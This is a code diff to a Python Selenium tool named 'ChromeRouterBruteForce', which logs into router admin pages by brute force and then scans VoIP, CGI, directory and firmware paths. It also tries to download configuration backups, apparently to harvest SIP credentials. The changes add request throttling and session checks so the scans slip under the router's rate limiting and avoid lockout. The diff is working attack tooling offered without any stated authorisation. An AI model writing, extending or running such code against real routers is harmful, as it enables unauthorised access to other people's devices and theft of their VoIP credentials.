@@ -180,9 +180,65 @@ class ChromeRouterBruteForce:
         self.lock = threading.Lock()
         self.vulnerable_findings = []  # Store vulnerable findings
         
+        # Rate limiting and session management
+        self.request_delay = 3  # Delay between requests to avoid rate limiting
+        self.session_timeout = 300  # Session timeout in seconds
+        self.last_request_time = 0
+        self.request_count = 0
+        self.max_requests_per_minute = 20  # Maximum requests per minute
+        
         # Create screenshot directory
         if not os.path.exists(self.screenshot_dir):
             os.makedirs(self.screenshot_dir)
+    
+    def rate_limit_check(self):
+        """Check and enforce rate limiting to avoid blocking"""
+        current_time = time.time()
+        
+        # Reset request count every minute
+        if current_time - self.last_request_time > 60:
+            self.request_count = 0
+            self.last_request_time = current_time
+        
+        # Check if we've exceeded the rate limit
+        if self.request_count >= self.max_requests_per_minute:
+            wait_time = 60 - (current_time - self.last_request_time)
+            if wait_time > 0:
+                print(f"{Colors.YELLOW}[*] Rate limit reached, waiting {wait_time:.1f} seconds...{Colors.END}")
+                time.sleep(wait_time)
+                self.request_count = 0
+                self.last_request_time = time.time()
+        
+        # Always add delay between requests
+        time.sleep(self.request_delay)
+        self.request_count += 1
+    
+    def check_session_validity(self):
+        """Check if session is still valid"""
+        try:
+            if not self.driver:
+                return False
+            
+            current_url = self.driver.current_url
+            page_source = self.driver.page_source.lower()
+            
+            # Check for session-related error messages
+            session_errors = [
+                'invalid session key', 'session expired', 'session timeout',
+                'please try again', 'session invalid', 'authentication required',
+                'login required', 'access denied', 'unauthorized'
+            ]
+            
+            for error in session_errors:
+                if error in page_source:
+                    print(f"{Colors.RED}[!] Session error detected: {error}{Colors.END}")
+                    return False
+            
+            return True
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error checking session: {e}{Colors.END}")
+            return False
     
     def setup_chrome_driver(self):
         """Setup Chrome driver with cross-platform support"""
@@ -817,13 +873,26 @@ class ChromeRouterBruteForce:
                     "/call_transfer.html", "/call_waiting.html", "/caller_id.html"
                 ]
                 
-                for path in voip_paths:
+                # Limit VoIP paths to avoid rate limiting
+                limited_voip_paths = voip_paths[:25]  # Only try first 25 VoIP paths
+                
+                for i, path in enumerate(limited_voip_paths):
                     try:
-                        voip_url = f"{base_url.rstrip('/')}{path}"
-                        print(f"{Colors.BLUE}[*] Trying VoIP path: {voip_url}{Colors.END}")
+                        # Check rate limiting before each request
+                        self.rate_limit_check()
                         
+                        # Check session validity
+                        if not self.check_session_validity():
+                            print(f"{Colors.RED}[!] Session invalid, stopping VoIP path scan{Colors.END}")
+                            break
+                        
+                        voip_url = f"{base_url.rstrip('/')}{path}"
+                        print(f"{Colors.BLUE}[*] Trying VoIP path ({i+1}/25): {voip_url}{Colors.END}")
+                        
+                        # Navigate to VoIP path with optimized timeout
+                        self.driver.set_page_load_timeout(3)
                         self.driver.get(voip_url)
-                        time.sleep(3)
+                        time.sleep(1)
                         
                         # Check if page loaded successfully and contains VoIP/SIP content
                         page_source = self.driver.page_source.lower()
@@ -1458,14 +1527,26 @@ class ChromeRouterBruteForce:
             
             found_directories = []
             
-            for pattern in directory_patterns:
+            # Limit directory patterns to avoid rate limiting
+            limited_directory_patterns = directory_patterns[:15]  # Only try first 15 directories
+            
+            for i, pattern in enumerate(limited_directory_patterns):
                 try:
-                    test_url = f"{base_url.rstrip('/')}{pattern}"
-                    print(f"{Colors.BLUE}[*] Testing directory: {test_url}{Colors.END}")
+                    # Check rate limiting before each request
+                    self.rate_limit_check()
                     
-                    # Navigate to directory
+                    # Check session validity
+                    if not self.check_session_validity():
+                        print(f"{Colors.RED}[!] Session invalid, stopping directory scan{Colors.END}")
+                        break
+                    
+                    test_url = f"{base_url.rstrip('/')}{pattern}"
+                    print(f"{Colors.BLUE}[*] Testing directory ({i+1}/15): {test_url}{Colors.END}")
+                    
+                    # Navigate to directory with optimized timeout
+                    self.driver.set_page_load_timeout(3)
                     self.driver.get(test_url)
-                    time.sleep(1)
+                    time.sleep(0.5)
                     
                     # Check if page loaded successfully
                     if "404" not in self.driver.title.lower() and "not found" not in self.driver.page_source.lower():
@@ -1517,12 +1598,24 @@ class ChromeRouterBruteForce:
             
             found_cgi = []
             
-            for pattern in cgi_patterns:
+            # Limit CGI patterns to avoid rate limiting
+            limited_cgi_patterns = cgi_patterns[:25]  # Only try first 25 CGI patterns
+            
+            for i, pattern in enumerate(limited_cgi_patterns):
                 try:
-                    test_url = f"{base_url.rstrip('/')}{pattern}"
-                    print(f"{Colors.BLUE}[*] Testing CGI: {test_url}{Colors.END}")
+                    # Check rate limiting before each request
+                    self.rate_limit_check()
                     
-                    # Navigate to CGI script
+                    # Check session validity
+                    if not self.check_session_validity():
+                        print(f"{Colors.RED}[!] Session invalid, stopping CGI scan{Colors.END}")
+                        break
+                    
+                    test_url = f"{base_url.rstrip('/')}{pattern}"
+                    print(f"{Colors.BLUE}[*] Testing CGI ({i+1}/25): {test_url}{Colors.END}")
+                    
+                    # Navigate to CGI script with optimized timeout
+                    self.driver.set_page_load_timeout(3)
                     self.driver.get(test_url)
                     time.sleep(1)
                     
@@ -1623,15 +1716,26 @@ class ChromeRouterBruteForce:
             
             found_paths = []
             
-            for path in advanced_paths:
+            # Limit advanced paths to avoid rate limiting
+            limited_advanced_paths = advanced_paths[:20]  # Only try first 20 paths
+            
+            for i, path in enumerate(limited_advanced_paths):
                 try:
+                    # Check rate limiting before each request
+                    self.rate_limit_check()
+                    
+                    # Check session validity
+                    if not self.check_session_validity():
+                        print(f"{Colors.RED}[!] Session invalid, stopping advanced path scan{Colors.END}")
+                        break
+                    
                     test_url = f"{base_url.rstrip('/')}{path}"
-                    print(f"{Colors.BLUE}[*] Testing advanced path: {test_url}{Colors.END}")
+                    print(f"{Colors.BLUE}[*] Testing advanced path ({i+1}/20): {test_url}{Colors.END}")
                     
                     # Navigate to path with optimized timeout
-                    self.driver.set_page_load_timeout(5)  # Reduced timeout for faster scanning
+                    self.driver.set_page_load_timeout(3)  # Reduced timeout for faster scanning
                     self.driver.get(test_url)
-                    time.sleep(0.5)  # Reduced wait time
+                    time.sleep(0.3)  # Reduced wait time
                     
                     # Check if path exists and has VoIP content
                     if "404" not in self.driver.title.lower() and "not found" not in self.driver.page_source.lower():
@@ -1750,14 +1854,25 @@ class ChromeRouterBruteForce:
             
             backup_file = None
             
-            for path in backup_paths:
+            # Limit backup paths to avoid rate limiting
+            limited_backup_paths = backup_paths[:30]  # Only try first 30 paths
+            
+            for i, path in enumerate(limited_backup_paths):
                 try:
-                    backup_url = f"{base_url.rstrip('/')}{path}"
-                    print(f"{Colors.BLUE}[*] Trying backup URL: {backup_url}{Colors.END}")
+                    # Check rate limiting before each request
+                    self.rate_limit_check()
                     
-                    # Try to download backup file
+                    # Check session validity
+                    if not self.check_session_validity():
+                        print(f"{Colors.RED}[!] Session invalid, stopping backup download{Colors.END}")
+                        break
+                    
+                    backup_url = f"{base_url.rstrip('/')}{path}"
+                    print(f"{Colors.BLUE}[*] Trying backup URL ({i+1}/30): {backup_url}{Colors.END}")
+                    
+                    # Try to download backup file with shorter timeout
                     import requests
-                    response = requests.get(backup_url, timeout=10, stream=True)
+                    response = requests.get(backup_url, timeout=5, stream=True)
                     
                     if response.status_code == 200:
                         content_type = response.headers.get('content-type', '').lower()
@@ -1961,23 +2076,23 @@ class ChromeRouterBruteForce:
             else:
                 print(f"{Colors.YELLOW}[!] No backup file found, falling back to comprehensive search...{Colors.END}")
                 
-                # Fallback to comprehensive search methods
-                print(f"{Colors.BLUE}[*] Fallback: Starting comprehensive VoIP/SIP search...{Colors.END}")
+                # Fallback to comprehensive search methods with rate limiting
+                print(f"{Colors.BLUE}[*] Fallback: Starting comprehensive VoIP/SIP search (rate-limited)...{Colors.END}")
                 
-                # Method 1: Extract hidden links from HTML source
+                # Method 1: Extract hidden links from HTML source (no requests)
                 print(f"{Colors.BLUE}[*] Method 1: Extracting hidden links from HTML source...{Colors.END}")
                 hidden_links = self.extract_hidden_links_from_html()
                 
-                # Method 2: Execute JavaScript to find dynamic links
+                # Method 2: Execute JavaScript to find dynamic links (no requests)
                 print(f"{Colors.BLUE}[*] Method 2: Executing JavaScript for dynamic links...{Colors.END}")
                 dynamic_links = self.execute_javascript_for_links()
                 
-                # Method 3: Scan common directories
-                print(f"{Colors.BLUE}[*] Method 3: Scanning common directory patterns...{Colors.END}")
+                # Method 3: Scan common directories (rate-limited)
+                print(f"{Colors.BLUE}[*] Method 3: Scanning common directory patterns (rate-limited)...{Colors.END}")
                 found_directories = self.scan_common_directories(base_url)
                 
-                # Method 4: Scan CGI scripts
-                print(f"{Colors.BLUE}[*] Method 4: Scanning CGI scripts...{Colors.END}")
+                # Method 4: Scan CGI scripts (rate-limited)
+                print(f"{Colors.BLUE}[*] Method 4: Scanning CGI scripts (rate-limited)...{Colors.END}")
                 found_cgi = self.scan_cgi_scripts(base_url)
                 
                 # Method 5: Scan advanced firmware paths
